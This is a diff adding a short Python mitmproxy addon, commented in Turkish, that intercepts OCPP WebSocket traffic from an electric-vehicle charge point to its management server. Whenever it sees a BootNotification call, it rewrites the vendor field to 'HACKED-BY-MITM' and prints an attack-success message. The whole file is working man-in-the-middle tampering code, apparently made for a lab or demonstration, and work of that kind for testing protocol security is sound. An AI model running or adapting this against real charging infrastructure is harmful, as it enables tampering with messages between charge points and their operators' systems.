@@ -1,0 +1,38 @@
+from mitmproxy import http
+import json
+
+class OcppMitM:
+    
+    def websocket_message(self, flow):
+        # Sadece istemciden (CP) sunucuya (CSMS) giden mesajları yakala
+        if flow.websocket and flow.websocket.messages[-1].from_client:
+            
+            raw_msg = flow.websocket.messages[-1].content.decode("utf8")
+            
+            # Mesajın BootNotification olup olmadığını kontrol et
+            if 'BootNotification' in raw_msg:
+                try:
+                    # OCPP mesajını JSON listesine çevir (Örn: [2, UUID, "BootNotification", {..}])
+                    ocpp_list = json.loads(raw_msg)
+                    
+                    # 1. Mesaj tipi CALL (2) olmalı.
+                    # 2. İşlem adı 'BootNotification' olmalı.
+                    if ocpp_list[0] == 2 and ocpp_list[2] == 'BootNotification':
+                        
+                        # SALDIRI: Vendor bilgisini değiştir
+                        ocpp_list[3]['chargePointVendor'] = "HACKED-BY-MITM"
+                        
+                        # Değiştirilmiş mesajı geri yükle
+                        new_msg = json.dumps(ocpp_list)
+                        flow.websocket.messages[-1].content = new_msg.encode("utf8")
+                        
+                        print("\n[!!! MITM SALDIRISI BAŞARILI !!!]")
+                        print(f"Vendor Bilgisi Değiştirildi.")
+                        
+                except Exception as e:
+                    # JSON parse hatası varsa görmezden gel
+                    print(f"MITM Parser Hatası: {e}")
+
+addons = [
+    OcppMitM()
+]
